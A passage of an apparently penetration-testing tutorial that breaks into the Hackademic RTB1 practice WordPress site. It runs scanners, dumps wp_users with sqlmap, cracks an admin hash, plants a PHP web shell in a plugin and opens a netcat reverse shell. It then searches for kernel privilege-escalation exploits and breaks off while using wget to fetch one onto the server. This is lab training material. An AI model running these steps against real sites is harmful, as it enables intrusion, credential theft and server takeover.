`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Target Hostname: hack-test.com `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Target Port: 80 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Start Time: 2011-12-29 06:50:03 `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">--------------------------------------------------------------------------- `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Server: Apache/2.2.15 (Fedora) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ ETag header found on server, inode: 12748, size: 1475, mtime: 0x4996d177f5c3b `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ OSVDB-3268: /icons/: Directory indexing found. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ OSVDB-3233: /icons/README: Apache default file found. `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ 6448 items checked: 1 error(s) and 6 item(s) reported on remote host `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ End Time: 2011-12-29 06:50:37 (34 seconds) `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">--------------------------------------------------------------------------- `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">+ 1 host(s) tested `

 

  

 

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan11-300x103.png)

We will also use W3AF. You can find this tool in backtrack 5 R1

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

14

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">  ``<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">root@bt:/pentest/web/w3af# ./w3af_gui `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Starting w3af, running on: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Python version: `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">2.6.5 (r265:79063, Apr 16 2010, 13:57:41) `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">[GCC 4.4.3] `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">GTK version: 2.20.1 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">PyGTK version: 2.17.0 `





`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">w3af - Web Application Attack and Audit Framework `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Version: 1.2 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Revision: 4605 `

`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Author: Andres Riancho and the w3af team.`

 

  

 



![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan12-300x83.png)

We will insert our site URL and choose full audit option:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan13-300x215.png)

After some time, the scan will finish and you will see

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan14-300x217.png)

Your site is vulnerable to sql injection, xss and others!

Let’s investigate the sql injection vulnerability:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan15-300x216.png)

[http://hack-test.com/Hackademic\_RTB1/?cat=d%27z%220](http://hack-test.com/Hackademic_RTB1/?cat=d%27z%220)

This is the vulnerable url and cat is the vulnerable parameter.

So, let’s exploit this vulnerability:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan16-300x214.png)

We will find that exploitating this vuln failed, so we will use sqlmap to the job and dump all database information that we need to hack this site J



Using sqlmap with –u url

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan17-300x13.png)

After some seconds you will see

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan18-300x11.png)

Type n and press enter to continue

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan19-300x34.png)

As you see your site is vulnerable to error-based sql injection and your mysql database version is 5

Let’s find all databases in your site by adding “–dbs ”

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan20-300x9.png)

Now we found 3 databases

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan21.png)

We will dump wordpress database tables by adding “–D wordpress –tables ”

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan22-300x11.png)

We will find all wordpress tables

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan23.png)

We want to dump “wp\_users” table, so we will find all users (admin?) information (user is and password hash) and try to crack hash and enter wordpress control panel ( wp-admin)

We will columns of “wp\_users” table by adding “-T wp\_users –columns ”

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan24-300x11.png)

We will find 22 columns

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan25-237x300.png)

We just need to dump to columns, so we will dump (user\_login and user\_pass ) columns by adding

-C user\_login,user\_pass –dump

We will find important information; we found now users and pass hashes

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan26-300x157.png)

but we want to crack those hashes to clear text passwords. We will use the online site “<http://www.onlinehashcrack.com/free-hash-reverse.php>”

And try to crack this hash **7CBB3252BA6B7E9C422FAC5334D22054**

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan27-300x62.png)

And clear text password is **q1w2e3**

And user name is “GeorgeMiller”

We will login with these details in “wp-admin ”

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan28-300x85.png)

And we are in!

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan29-300x137.png)

Ok let’s try to upload php web shell to run some linux commands on your site server J

We will edit a plugin in wordpress called “[Textile ](http://www.huddledmasses.org/ "Visit plugin homepage")” or any plugin you found in plugins page.

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan30-300x123.png)

And choose to edit it

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan31-300x140.png)

We will insert php web shell instead of real plugin. After we’ve done this, we will hit “update file” and browse to our new php shell

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan32-300x154.png)

Woo, the php shell works. Now we can manipulate your site files, but we want only to get root on your server and hack all other sites too.

We will choose “back-connect “tab from php web shell and make back connection to our ip “192.168.1.6″ on port “5555″

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan33-300x153.png)

But before we hit connect, we first make netcat listen on port “5555″ on our attacker machine

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan34-300x30.png)

Now hit connect and you will see:

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan35-300x27.png)



Let’s try some linux commands

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">id `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">uid=48(apache) gid=489(apache) groups=489(apache) `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">pwd `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">/var/www/html/Hackademic_RTB1/wp-content/plugins `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">uname -a `



`<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux`

 

  

 

![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan36-300x80.png)

Id command is used to show us what user id, group.

pwd command is used to show us our current path on server

uname –a command is used to show us some information about kernel version



Ok, now we knew that server kernel version is 2.6.31.5-127.fc12.1686

Let’s search in exploit-db.com for exploit to this version or newer version

We will type “kernel 2.6.31 ”



 **Date**

  **D**

  **A**

  **V**

  **Description**

   **Plat.**

  **Author**

  2009-10-15

  [![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan37.png)](http://www.exploit-db.com/download/10202)

  –

  ![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan38.png)

  [Linux Kernel < 2.6.31-rc4 nfs4\_proc\_lock() Denial of Service](http://www.exploit-db.com/exploits/10202)

  904

  [linux](http://www.exploit-db.com/platform/?p=linux)

  [Simon Vallet](http://www.exploit-db.com/author/?a=1967 "Simon Vallet")

  2009-08-31

  [![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan39.png)](http://www.exploit-db.com/download/9543)

  –

  ![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan40.png)

  [Linux Kernel < 2.6.31-rc7 AF\_IRDA 29-Byte Stack Disclosure Exploit](http://www.exploit-db.com/exploits/9543)

  1370

  [linux](http://www.exploit-db.com/platform/?p=linux)

  [Jon Oberheide](http://www.exploit-db.com/author/?a=1507 "Jon Oberheide")

  2009-08-25

  [![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan41.png)](http://www.exploit-db.com/download/9513)

  –

  ![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan42.png)

  [Linux Kernel <= 2.6.31-rc7 AF\_LLC getsockname 5-Byte Stack Disclosure](http://www.exploit-db.com/exploits/9513)

  1059

  [linux](http://www.exploit-db.com/platform/?p=linux)

  [Jon Oberheide](http://www.exploit-db.com/author/?a=1507 "Jon Oberheide")

  2009-08-04

  [![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan43.png)](http://www.exploit-db.com/download/9352)

  –

  ![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan44.png)

  [Linux Kernel <= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure Exploit](http://www.exploit-db.com/exploits/9352)

  1064

  [linux](http://www.exploit-db.com/platform/?p=linux)

  [Jon Oberheide](http://www.exploit-db.com/author/?a=1507 "Jon Oberheide")

  

After I tried all of them on your server, none of them worked, but then I tried a new exploit

 **Date**

  **D**

  **A**

  **V**

  **Description**

   **Plat.**

  **Author**

  2010-10-19

  [![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan45.png)](http://www.exploit-db.com/download/15285)

  –

  ![](http://35.160.74.13/wp-content/uploads/2012/10/010512_1633_Targetingan46.png)

  [Linux RDS Protocol Local Privilege Escalation](http://www.exploit-db.com/exploits/15285)

  9977

  [linux](http://www.exploit-db.com/platform/?p=linux)

  [Dan Rosenberg](http://www.exploit-db.com/author/?a=2956 "Dan Rosenberg")

  

<http://www.exploit-db.com/exploits/15285>

I opened this url and copied this link

http://www.exploit-db.com/download/15285

And made this command on my netcat shell

[?](http://resources.infosecinstitute.com/hacking-a-wordpress-site/#)

 01

02

03

04

05

06

07

08

09

10

11

12

13

  `<code style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; display: inline !important; float: none !important; font-family: Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; top: auto !important; vertical-align: baseline !important; width: auto !important;">wget <a href="http://www.exploit-db.com/download/15285" style="background-image: none !important; border-bottom-left-radius: 0px !important; border-bottom-right-radius: 0px !important; border-top-left-radius: 0px !important; border-top-right-radius: 0px !important; border: 0px !important; bottom: auto !important; box-sizing: content-box !important; color: black !important; direction: ltr !important; float: none !important; font-size: 1em !important; height: auto !important; left: auto !important; line-height: 1.1em !important; margin: 0px !important; outline: 0px !important; overflow: visible !important; padding: 0px !important; position: static !important; right: auto !important; text-decoration: initial; top: auto !important; vertical-align: baseline !important; width: auto !important;">http://www.exploit-db.com/download/15285</a> -O roro.c `

